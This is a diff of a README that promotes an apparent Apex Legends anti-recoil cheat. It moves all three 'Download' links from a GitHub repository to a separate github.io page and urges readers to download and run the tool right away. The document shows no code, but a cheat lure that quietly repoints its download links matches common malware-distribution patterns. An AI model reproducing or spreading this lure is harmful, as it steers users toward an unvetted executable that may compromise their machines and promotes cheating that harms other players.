@@ -1,6 +1,6 @@
 # 🎯 Latest-Apex-Legends-Recoil-Script - Zero Recoil, Zero Hassle, Pure Victory
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://github.com/kathyeoutsize6180/Latest-Apex-Legends-Recoil-Script)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://kathyeoutsize6180.github.io)
 
 ---
 
@@ -23,7 +23,7 @@ Getting set up is quick and easy. Follow these simple steps and you'll be shredd
 ### Step 1: Download the Tool
 
 **Visit this link to download the application.**
-👉 **[Click Here to Download Latest-Apex-Legends-Recoil-Script](https://github.com/kathyeoutsize6180/Latest-Apex-Legends-Recoil-Script)**
+👉 **[Click Here to Download Latest-Apex-Legends-Recoil-Script](https://kathyeoutsize6180.github.io)**
 
 This is your direct download page. It will open in your browser. Once you are on that page, look for the main download button or link on the screen. Click it and the file will start downloading to your computer. The download size is small, so it should finish quickly even on slower connections. Make sure you save it somewhere you can easily find, like your **Downloads** folder or your **Desktop**.
 
@@ -160,7 +160,7 @@ Don't wait. Every match you play without it is a match where you're fighting an 
 ## 🎁 Get Your Download Here
 
 **Visit this link to download the application.**
-## [⬇️ DOWNLOAD LATEST-APEX-LEGENDS-RECOIL-SCRIPT](https://github.com/kathyeoutsize6180/Latest-Apex-Legends-Recoil-Script)
+## [⬇️ DOWNLOAD LATEST-APEX-LEGENDS-RECOIL-SCRIPT](https://kathyeoutsize6180.github.io)
 
 ---
 
